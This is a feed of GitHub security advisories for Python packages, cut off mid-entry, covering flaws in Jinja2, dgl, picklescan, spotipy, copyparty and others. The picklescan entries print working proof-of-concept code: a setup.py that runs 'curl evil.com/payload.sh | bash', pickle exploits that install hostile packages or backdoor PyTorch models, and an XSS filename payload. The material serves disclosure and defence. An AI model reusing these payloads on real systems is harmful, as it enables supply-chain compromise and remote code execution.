<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2025-03-05T21:01:24.495Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[Jinja2] Jinja2 vulnerable to sandbox breakout through attr filter selecting format method]]></title>
        <id>https://github.com/advisories/GHSA-cpwx-vrp4-4pq7</id>
        <link href="https://github.com/advisories/GHSA-cpwx-vrp4-4pq7"/>
        <updated>2025-03-05T20:40:16.000Z</updated>
        <content type="html"><![CDATA[<p>An oversight in how the Jinja sandboxed environment interacts with the <code>|attr</code> filter allows an attacker that controls the content of a template to execute arbitrary Python code.</p>
<p>To exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.</p>
<p>Jinja's sandbox does catch calls to <code>str.format</code> and ensures they don't escape the sandbox. However, it's possible to use the <code>|attr</code> filter to get a reference to a string's plain format method, bypassing the sandbox. After the fix, the <code>|attr</code> filter no longer bypasses the environment's attribute lookup.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pallets/jinja/security/advisories/GHSA-cpwx-vrp4-4pq7">https://github.com/pallets/jinja/security/advisories/GHSA-cpwx-vrp4-4pq7</a></li>
<li><a href="https://github.com/pallets/jinja/commit/90457bbf33b8662926ae65cdde4c4c32e756e403">https://github.com/pallets/jinja/commit/90457bbf33b8662926ae65cdde4c4c32e756e403</a></li>
<li><a href="https://github.com/advisories/GHSA-cpwx-vrp4-4pq7">https://github.com/advisories/GHSA-cpwx-vrp4-4pq7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cpwx-vrp4-4pq7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-05T20:40:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dgl] dmlc/dgl Vulnerable to Remote Code Execution by Pickle Deserialization via rpc.recv_request()]]></title>
        <id>https://github.com/advisories/GHSA-3x5x-fw77-g54c</id>
        <link href="https://github.com/advisories/GHSA-3x5x-fw77-g54c"/>
        <updated>2025-03-05T19:50:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Dgl implements rpc server (start_server() in rpc_server.py) for supporting the RPC communications among different remote users over networks. It relies on pickle serialize and deserialize to pack and unpack network messages. The is a known risk in pickle deserialization functionality that can be used for remote code execution.</p>
<h3 id="patches">Patches</h3>
<p>TBD.</p>
<h3 id="workarounds">Workarounds</h3>
<p>When running DGL distributed training and inference (DistDGL) make sure you do not assign public IPs to any instance in the cluster.</p>
<h3 id="references">References</h3>
<p>Issue #7874</p>
<h3 id="reported-by">Reported by</h3>
<p>Pinji Chen (<a href="mailto:cpj24@mails.tsinghua.edu.cn">cpj24@mails.tsinghua.edu.cn</a>) from NISL lab (<a href="https://netsec.ccert.edu.cn/about">https://netsec.ccert.edu.cn/about</a>) at Tsinghua University</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/dmlc/dgl/security/advisories/GHSA-3x5x-fw77-g54c">https://github.com/dmlc/dgl/security/advisories/GHSA-3x5x-fw77-g54c</a></li>
<li><a href="https://github.com/dmlc/dgl/issues/7874">https://github.com/dmlc/dgl/issues/7874</a></li>
<li><a href="https://github.com/advisories/GHSA-3x5x-fw77-g54c">https://github.com/advisories/GHSA-3x5x-fw77-g54c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3x5x-fw77-g54c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-05T19:50:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: Picklescan Allows Remote Code Execution via Malicious Pickle File Bypassing Static Analysis]]></title>
        <id>https://github.com/advisories/GHSA-hw34-rqc5-h2gm</id>
        <link href="https://github.com/advisories/GHSA-hw34-rqc5-h2gm"/>
        <updated>2025-03-04T14:29:39.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-769v-p64c-89pr. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>picklescan before 0.0.22 only considers standard pickle file extensions in the scope for its vulnerability scan. An attacker could craft a malicious model that uses Pickle include a malicious pickle file with a non-standard file extension. Because the malicious pickle file inclusion is not considered as part of the scope of picklescan, the file would pass security checks and appear to be safe, when it could instead prove to be problematic.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-655q-fx9r-782v">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-655q-fx9r-782v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1889">https://nvd.nist.gov/vuln/detail/CVE-2025-1889</a></li>
<li><a href="https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1889">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1889</a></li>
<li><a href="https://github.com/advisories/GHSA-hw34-rqc5-h2gm">https://github.com/advisories/GHSA-hw34-rqc5-h2gm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hw34-rqc5-h2gm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-03T21:30:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Picklescan Allows Remote Code Execution via Malicious Pickle File Bypassing Static Analysis]]></title>
        <id>https://github.com/advisories/GHSA-655q-fx9r-782v</id>
        <link href="https://github.com/advisories/GHSA-655q-fx9r-782v"/>
        <updated>2025-03-04T14:30:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="cve-2025-1716">CVE-2025-1716</h3>
<h3 id="summary">Summary</h3>
<p>An unsafe deserialization vulnerability in Python’s pickle module allows an attacker to bypass static analysis tools like Picklescan and execute arbitrary code during deserialization. This can be exploited to run pip install and fetch a malicious package, enabling remote code execution (RCE) upon package installation.</p>
<h3 id="details">Details</h3>
<p>Pickle’s deserialization process allows execution of arbitrary functions via the <strong>reduce</strong> method. While Picklescan is designed to detect such exploits, this attack evades detection by leveraging pip.main() as the callable function. Since pip is a legitimate package operation, it may not raise red flags in security scans.</p>
<p>The payload executes the following steps:</p>
<ol>
<li>During unpickling, it calls pip.main() to install a malicious PyPI package.</li>
<li>The installed package runs arbitrary code via setup.py, entry_points, or post-install hooks.</li>
<li>Execution is silent, with minimal logging to avoid detection.</li>
</ol>
<h3 id="poc">PoC</h3>
<p>Step 1: Create the Malicious Package
Host a PyPI package with a malicious setup.py or entry_point.</p>
<p>Example malicious <code>setup.py</code></p>
<pre><code>from setuptools import setup
import os

os.system("curl -s https://evil.com/payload.sh | bash")  # Executes remote shell script

setup(
    name="rsac-demo-package",
    version="0.1",
    packages=["rsac_demo"],
    install_requires=[],
)
</code></pre>
<p>Upload it to PyPI or host on GitHub.</p>
<p>Step 2: Exploit via Pickle</p>
<pre><code>import pickle
import pip

class Exploit:
    def __reduce__(self):
        return pip.main, (
            ['install', 'git+https://github.com/madgetr/rsac-demo-package', '--no-input', '-q', '-q', '-q',
             '--exists-action', 'i', '--isolated'],
        )

malicious_pickle = pickle.dumps(Exploit())

# Simulating deserialization attack
pickle.loads(malicious_pickle)
</code></pre>
<p>This installs a malicious package from GitHub or PyPI.
The payload runs automatically when unpickled, executing any code inside the installed package leveraging the <code>setup.py</code> file.</p>
<h3 id="impact">Impact</h3>
<p>Remote Code Execution (RCE): Any system that deserializes a malicious pickle is compromised.
Supply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.
Bypasses Picklescan: Security tools may not flag pip.main(), making it harder to detect.</p>
<h3 id="recommended-fixes">Recommended Fixes</h3>
<p>Add  <code>"pip": "*"</code> to the list of <a href="https://github.com/mmaitre314/picklescan/blob/25d753f4b9a27ce141a43df3bf88d731800593d9/src/picklescan/scanner.py#L96">unsafe globals</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-655q-fx9r-782v">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-655q-fx9r-782v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1716">https://nvd.nist.gov/vuln/detail/CVE-2025-1716</a></li>
<li><a href="https://github.com/mmaitre314/picklescan/commit/78ce704227c51f070c0c5fb4b466d92c62a7aa3d">https://github.com/mmaitre314/picklescan/commit/78ce704227c51f070c0c5fb4b466d92c62a7aa3d</a></li>
<li><a href="https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1716">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1716</a></li>
<li><a href="https://github.com/advisories/GHSA-655q-fx9r-782v">https://github.com/advisories/GHSA-655q-fx9r-782v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-655q-fx9r-782v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-03T20:05:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: Remote Code Execution via Malicious Pickle File Bypassing Static Analysis]]></title>
        <id>https://github.com/advisories/GHSA-vr75-hjh9-7fr6</id>
        <link href="https://github.com/advisories/GHSA-vr75-hjh9-7fr6"/>
        <updated>2025-03-03T20:05:27.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-655q-fx9r-782v. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>picklescan before 0.0.21 does not treat 'pip' as an unsafe global. An attacker could craft a malicious model that uses Pickle to pull in a malicious PyPI package (hosted, for example, on pypi.org or GitHub) via <code>pip.main()</code>. Because pip is not a restricted global, the model, when scanned with picklescan, would pass security checks and appear to be safe, when it could instead prove to be problematic.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-655q-fx9r-782v">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-655q-fx9r-782v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1716">https://nvd.nist.gov/vuln/detail/CVE-2025-1716</a></li>
<li><a href="https://github.com/mmaitre314/picklescan/commit/78ce704227c51f070c0c5fb4b466d92c62a7aa3d">https://github.com/mmaitre314/picklescan/commit/78ce704227c51f070c0c5fb4b466d92c62a7aa3d</a></li>
<li><a href="https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1716">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1716</a></li>
<li><a href="https://github.com/advisories/GHSA-vr75-hjh9-7fr6">https://github.com/advisories/GHSA-vr75-hjh9-7fr6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vr75-hjh9-7fr6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-03T18:31:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] PyTorch Model Files Can Bypass Pickle Scanners via Unexpected Pickle Extensions]]></title>
        <id>https://github.com/advisories/GHSA-769v-p64c-89pr</id>
        <link href="https://github.com/advisories/GHSA-769v-p64c-89pr"/>
        <updated>2025-03-03T22:23:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="cve-2025-1889">CVE-2025-1889</h3>
<h3 id="summary">Summary</h3>
<p>Picklescan fails to detect hidden pickle files embedded in PyTorch model archives due to its reliance on file extensions for detection. This allows an attacker to embed a secondary, malicious pickle file with a non-standard extension inside a model archive, which remains undetected by picklescan but is still loaded by PyTorch's torch.load() function. This can lead to arbitrary code execution when the model is loaded.</p>
<h3 id="details">Details</h3>
<p>Picklescan primarily identifies pickle files by their extensions (e.g., .pkl, .pt). However, PyTorch allows specifying an alternative pickle file inside a model archive using the pickle_file parameter when calling torch.load(). This makes it possible to embed a malicious pickle file (e.g., config.p) inside the model while keeping the primary data.pkl file benign.</p>
<p>A typical attack works as follows:</p>
<ul>
<li>A PyTorch model (model.pt) is created and saved normally.</li>
<li>A second pickle file (config.p) containing a malicious payload is crafted.</li>
<li>The data.pkl file in the model is modified to contain an object that calls torch.load(model.pt, pickle_file='config.p'), causing config.p to be loaded when the model is opened.</li>
<li>Since picklescan ignores non-standard extensions, it does not scan config.p, allowing the malicious payload to evade detection.</li>
<li>The issue is exacerbated by the fact that PyTorch models are widely shared in ML repositories and organizations, making it a potential supply-chain attack vector.</li>
</ul>
<h3 id="poc">PoC</h3>
<pre><code>import os
import pickle
import torch
import zipfile
from functools import partial

class RemoteCodeExecution:
    def __reduce__(self):
        return os.system, ("curl -s http://localhost:8080 | bash",)

# Create a directory inside the model
os.makedirs("model", exist_ok=True)

# Create a hidden malicious pickle file
with open("model/config.p", "wb") as f:
    pickle.dump(RemoteCodeExecution(), f)

# Create a benign model
model = {}
class AutoLoad:
    def __init__(self, path, **kwargs):
        self.path = path
        self.kwargs = kwargs

    def __reduce__(self):
        # Use functools.partial to create a partially applied function
        # with torch.load and the pickle_file argument
        return partial(torch.load, self.path, **self.kwargs), ()

model['config'] = AutoLoad(model_name, pickle_file='config.p', weights_only=False)
torch.save(model, "model.pt")

# Inject the second pickle into the model archive
with zipfile.ZipFile("model.pt", "a") as archive:
    archive.write("model/config.p", "model/config.p")

# Loading the model triggers execution of config.p
torch.load("model.pt")
</code></pre>
<h3 id="impact">Impact</h3>
<p>Severity: High</p>
<p>Who is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.</p>
<p>What is the impact? Attackers can embed malicious code in PyTorch models that remains undetected but executes when the model is loaded.</p>
<p>Potential Exploits: This vulnerability could be exploited in supply chain attacks, backdooring pre-trained models distributed via repositories like Hugging Face or PyTorch Hub.</p>
<h3 id="recommendations">Recommendations</h3>
<ol>
<li>Scan All Files in the ZIP Archive: picklescan should analyze all files in the archive instead of relying on file extensions.</li>
<li>Detect Hidden Pickle References: Static analysis should detect torch.load(pickle_file=...) calls inside data.pkl.</li>
<li>Magic Byte Detection: Instead of relying on extensions, picklescan should inspect file contents for pickle magic bytes (\x80\x05).</li>
<li>Block the following globals:
 - torch.load
 - Block functools.partial</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-769v-p64c-89pr">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-769v-p64c-89pr</a></li>
<li><a href="https://github.com/mmaitre314/picklescan/commit/baf03faf88fece56a89534d12ce048e5ee36e50e">https://github.com/mmaitre314/picklescan/commit/baf03faf88fece56a89534d12ce048e5ee36e50e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1889">https://nvd.nist.gov/vuln/detail/CVE-2025-1889</a></li>
<li><a href="https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1889">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1889</a></li>
<li><a href="https://github.com/advisories/GHSA-769v-p64c-89pr">https://github.com/advisories/GHSA-769v-p64c-89pr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-769v-p64c-89pr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-03T19:59:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[codechecker] CodeChecker open redirect when URL contains multiple slashes after the product name]]></title>
        <id>https://github.com/advisories/GHSA-g839-x3p3-g5fm</id>
        <link href="https://github.com/advisories/GHSA-g839-x3p3-g5fm"/>
        <updated>2025-03-03T19:53:19.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>CodeChecker versions up to 6.24.5 contain an open redirect vulnerability due to missing protections against multiple slashes after the product name in the URL's path segment.  This results in bypassing protections against CVE-2021-28861, leading to the same open redirect pathway.</p>
<h2 id="details">Details</h2>
<p>CodeChecker processes GET requests by first rewriting the path segment of the URL, and then passing the rewritten URL to the webserver framework.
When trimming the product name from the URL, no sanitization was performed on the remaining URL, which reintroduced the same issue as CVE-2021-28861, leading to the same open redirect pathway using URLs such as <code>/Default//attacker.com/%2f..</code>.</p>
<h2 id="impact">Impact</h2>
<p>The vulnerability allows an attacker to create a hyperlink that looks like a legitimate CodeChecker URL, but redirects to an attacker-supplied website when clicked.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Ericsson/codechecker/security/advisories/GHSA-g839-x3p3-g5fm">https://github.com/Ericsson/codechecker/security/advisories/GHSA-g839-x3p3-g5fm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1300">https://nvd.nist.gov/vuln/detail/CVE-2025-1300</a></li>
<li><a href="https://github.com/advisories/GHSA-g839-x3p3-g5fm">https://github.com/advisories/GHSA-g839-x3p3-g5fm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g839-x3p3-g5fm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-03T19:53:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flask-appbuilder] Flask-AppBuilder Observable Response Discrepancy]]></title>
        <id>https://github.com/advisories/GHSA-p8q5-cvwx-wvwp</id>
        <link href="https://github.com/advisories/GHSA-p8q5-cvwx-wvwp"/>
        <updated>2025-03-03T19:41:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>User enumeration in database authentication in Flask-AppBuilder &lt;= 4.5.3 and werkzeug &gt;= 3.0.0. Allows for a non authenticated user to enumerate existing usernames by timing the response time from the server when brute forcing requests to login.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to flask-appbuilder&gt;=4.5.3</p>
<h3 id="workarounds">Workarounds</h3>
<p>Downgrade werkzeug to &lt;3.0.0</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/dpgaspar/Flask-AppBuilder/security/advisories/GHSA-p8q5-cvwx-wvwp">https://github.com/dpgaspar/Flask-AppBuilder/security/advisories/GHSA-p8q5-cvwx-wvwp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24023">https://nvd.nist.gov/vuln/detail/CVE-2025-24023</a></li>
<li><a href="https://github.com/advisories/GHSA-p8q5-cvwx-wvwp">https://github.com/advisories/GHSA-p8q5-cvwx-wvwp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p8q5-cvwx-wvwp</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-03-03T15:26:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[spotipy] Spotipy's cache file, containing spotify auth token, is created with overly broad permissions]]></title>
        <id>https://github.com/advisories/GHSA-pwhh-q4h6-w599</id>
        <link href="https://github.com/advisories/GHSA-pwhh-q4h6-w599"/>
        <updated>2025-02-28T02:34:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>CacheHandler</code> class creates a cache file to store the auth token here: <a href="https://github.com/spotipy-dev/spotipy/blob/master/spotipy/cache_handler.py#L93-L98">https://github.com/spotipy-dev/spotipy/blob/master/spotipy/cache_handler.py#L93-L98</a></p>
<p>The file created has <code>rw-r--r--</code> (644) permissions by default, when it could be locked down to <code>rw-------</code> (600) permissions. I think <code>600</code> is a sensible default.</p>
<p><img alt="image" src="https://github.com/user-attachments/assets/0b7ebbc1-a27a-4528-ab6a-135c7886766a"></p>
<h3 id="details">Details</h3>
<p>This leads to overly broad exposure of the spotify auth token. If this token can be read by an attacker (another user on the machine, or a process running as another user), it can be used to perform administrative actions on the Spotify account, depending on the scope granted to the token.</p>
<h3 id="poc">PoC</h3>
<p>Run an application that uses spotipy with client creation like this:</p>
<pre><code class="language-python">from pathlib import Path
import spotipy
from os import getenv

def create_spotify_client(client_id: str, client_secret: str) -&gt; spotipy.Spotify:
    """Create and return an authenticated Spotify client.

    Args:
        client_id: Spotify API client ID
        client_secret: Spotify API client secret

    Returns:
        An authenticated Spotify client instance
    """
    cache_path = Path.home() / ".cache" / "spotify-backup/.auth_cache"
    cache_path.parent.mkdir(parents=True, exist_ok=True)
    cache_handler = spotipy.cache_handler.CacheFileHandler(cache_path=str(cache_path))

    client = spotipy.Spotify(
        auth_manager=spotipy.oauth2.SpotifyOAuth(
            client_id=client_id,
            client_secret=client_secret,
            redirect_uri="http://localhost:8000/callback",
            cache_handler=cache_handler,
            scope=[
                "user-library-read",
                "playlist-read-private",
                "playlist-read-collaborative",
            ],
        )
    )

    return client

create_spotify_client()
</code></pre>
<p>And then check the file permissions on the cache file that was created with:</p>
<pre><code class="language-bash">$ ls -la ~/.cache/spotify-backup/.auth_cache`
.rw-r--r--. alichtman alichtman 562 B Thu Feb 20 02:12:33 2025  /home/alichtman/.cache/spotify-backup/.auth_cache
</code></pre>
<p>If this issue is combined with another misconfiguration, like having <code>o+r</code> permissions set on your home directory, an attacker will be able to read this file and steal this auth token.</p>
<p>Good defense in depth would be to restrict read permissions on this cache file that contains an auth token</p>
<h3 id="impact">Impact</h3>
<p>Potential exposure of Spotify auth token to other users with access to the machine. A worst case scenario is if the token is granted all permissions, and can be used to do any of:</p>
<ul>
<li>exfiltrate spotify likes / saved playlists</li>
<li>delete your content</li>
<li>modify your content w/o your permission</li>
</ul>
<p>If someone were to discover an RCE in Spotify that you could trigger on a machine by having a song played (or song metadata parsed or something), this auth token could maybe be used to add a song to a playlist, or control playback (allowing further exploitation).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/spotipy-dev/spotipy/security/advisories/GHSA-pwhh-q4h6-w599">https://github.com/spotipy-dev/spotipy/security/advisories/GHSA-pwhh-q4h6-w599</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27154">https://nvd.nist.gov/vuln/detail/CVE-2025-27154</a></li>
<li><a href="https://github.com/spotipy-dev/spotipy/commit/1ca453f6ef87a2a9e9876f52b6cb38d13532ccf2">https://github.com/spotipy-dev/spotipy/commit/1ca453f6ef87a2a9e9876f52b6cb38d13532ccf2</a></li>
<li><a href="https://github.com/spotipy-dev/spotipy/blob/master/spotipy/cache_handler.py#L93-L98">https://github.com/spotipy-dev/spotipy/blob/master/spotipy/cache_handler.py#L93-L98</a></li>
<li><a href="https://github.com/spotipy-dev/spotipy/releases/tag/2.25.1">https://github.com/spotipy-dev/spotipy/releases/tag/2.25.1</a></li>
<li><a href="https://github.com/advisories/GHSA-pwhh-q4h6-w599">https://github.com/advisories/GHSA-pwhh-q4h6-w599</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pwhh-q4h6-w599</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-28T02:34:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[copyparty] copyparty renders unsanitized filenames as HTML when user uploads empty files]]></title>
        <id>https://github.com/advisories/GHSA-m2jw-cj8v-937r</id>
        <link href="https://github.com/advisories/GHSA-m2jw-cj8v-937r"/>
        <updated>2025-02-26T20:06:58.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A <a href="https://capec.mitre.org/data/definitions/588.html">DOM-Based XSS</a> was discovered in <a href="https://github.com/9001/copyparty">copyparty</a>, a portable fileserver. The vulnerability is considered low-risk.</p>
<h2 id="details">Details</h2>
<p>By handing someone a maliciously-named file, and then tricking them into dragging the file into copyparty's Web-UI, an attacker could execute arbitrary javascript with the same privileges as that user. For example, this could give unintended read-access to files owned by that user. The bug is triggered by the drag-drop action itself; it is not necessary to actually initiate the upload. The file must be empty (zero bytes).</p>
<p>Note: As a general-purpose webserver, it is intentionally possible to upload HTML-files with arbitrary javascript in <code>&lt;script&gt;</code> tags, which will execute when the file is opened. The difference is that this vulnerability would trigger execution of javascript during the act of uploading, and not when the uploaded file was opened.</p>
<h2 id="proof-of-concept-poc">Proof of Concept (POC)</h2>
<ol>
<li>Create an empty file named <code>&lt;img src=x onerror="alert(1)"&gt;</code></li>
<li>Drag-and-drop the file into the browser to initiate an upload</li>
<li>The <code>alert(1)</code> is executed</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/9001/copyparty/security/advisories/GHSA-m2jw-cj8v-937r">https://github.com/9001/copyparty/security/advisories/GHSA-m2jw-cj8v-937r</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27145">https://nvd.nist.gov/vuln/detail/CVE-2025-27145</a></li>
<li><a href="https://github.com/9001/copyparty/commit/438ea6ccb06f39d7cbb4b6ee7ad44606e21a63dd">https://github.com/9001/copyparty/commit/438ea6ccb06f39d7cbb4b6ee7ad44606e21a63dd</a></li>
<li><a href="https://github.com/9001/copyparty/releases/tag/v1.16.15">https://github.com/9001/copyparty/releases/tag/v1.16.15</a></li>
<li><a href="https://github.com/advisories/GHSA-m2jw-cj8v-937r">https://github.com/advisories/GHSA-m2jw-cj8v-937r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m2jw-cj8v-937r</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-02-26T20:06:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jupyterhub-ltiauthenticator] LTI JupyterHub Authenticator does not properly validate JWT Signature]]></title>
        <id>https://github.com/advisories/GHSA-mcgx-2gcr-p3hp</id>
        <link href="https://github.com/advisories/GHSA-mcgx-2gcr-p3hp"/>
        <updated>2025-02-25T17:48:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Only users that has configured a JupyterHub installation to use the authenticator class <code>LTI13Authenticator</code> are influenced.</p>
<p>LTI13Authenticator that was introduced in <code>jupyterhub-ltiauthenticator</code> 1.3.0 wasn't validating JWT signatures. This is believed to allow the LTI13Authenticator to authorize a forged request granting access to existing and new user identities.</p>
<h3 id="patches">Patches</h3>
<p>None.</p>
<h3 id="workarounds">Workarounds</h3>
<p>None.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jupyterhub/ltiauthenticator/blob/3feec2e81b9d3b0ad6b58ab4226af640833039f3/ltiauthenticator/lti13/validator.py#L122-L164">This code segment</a> didn't validate a JWT signature.</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/jupyterhub/ltiauthenticator/security/advisories/GHSA-mcgx-2gcr-p3hp">https://github.com/jupyterhub/ltiauthenticator/security/advisories/GHSA-mcgx-2gcr-p3hp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-25574">https://nvd.nist.gov/vuln/detail/CVE-2023-25574</a></li>
<li><a href="https://github.com/jupyterhub/ltiauthenticator/blob/3feec2e81b9d3b0ad6b58ab4226af640833039f3/ltiauthenticator/lti13/validator.py#L122-L164">https://github.com/jupyterhub/ltiauthenticator/blob/3feec2e81b9d3b0ad6b58ab4226af640833039f3/ltiauthenticator/lti13/validator.py#L122-L164</a></li>
<li><a href="https://github.com/jupyterhub/ltiauthenticator/blob/main/CHANGELOG.md#140---2023-03-01">https://github.com/jupyterhub/ltiauthenticator/blob/main/CHANGELOG.md#140---2023-03-01</a></li>
<li><a href="https://github.com/advisories/GHSA-mcgx-2gcr-p3hp">https://github.com/advisories/GHSA-mcgx-2gcr-p3hp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mcgx-2gcr-p3hp</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-02-25T17:48:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ansible-core] Ansible vulnerable to Insertion of Sensitive Information into Log File]]></title>
        <id>https://github.com/advisories/GHSA-jpxc-vmjf-9fcj</id>
        <link href="https://github.com/advisories/GHSA-jpxc-vmjf-9fcj"/>
        <updated>2025-02-24T15:15:39.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was found in Ansible, where sensitive information stored in Ansible Vault files can be exposed in plaintext during the execution of a playbook. This occurs when using tasks such as include_vars to load vaulted variables without setting the no_log: true parameter, resulting in sensitive data being printed in the playbook output or logs. This can lead to the unintentional disclosure of secrets like passwords or API keys, compromising security and potentially allowing unauthorized access or actions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8775">https://nvd.nist.gov/vuln/detail/CVE-2024-8775</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-8775">https://access.redhat.com/security/cve/CVE-2024-8775</a></li>
